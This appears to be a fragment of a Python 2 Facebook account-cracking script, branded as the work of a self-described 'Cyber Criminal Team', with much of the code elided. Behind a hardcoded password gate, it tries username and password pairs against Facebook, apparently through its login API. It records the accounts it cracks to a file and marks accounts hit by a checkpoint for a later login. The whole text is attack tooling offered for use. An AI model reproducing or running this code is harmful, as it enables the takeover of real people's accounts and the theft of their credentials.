...
logo = """
 ...
 888    88888   8888888888888888888
 8			8888	88888888888888
 S.K Somrat SK Cyber Criminal Team 
...
oks = []
id = []
print 'AUTHOR : NAZIM SOMRAT '
print 'FACEBOOK :demon.king.wish'
print 'GITHUB : https://github.com/N4Y66M/'
CorrectUsername = 'criminal '
CorrectPassword = 'criminal '
loop = 'true'
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/demon.king.wish')
    else:
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Ok-N4Y66M-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[Cp-N4Y66M-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 10 Days]\n'
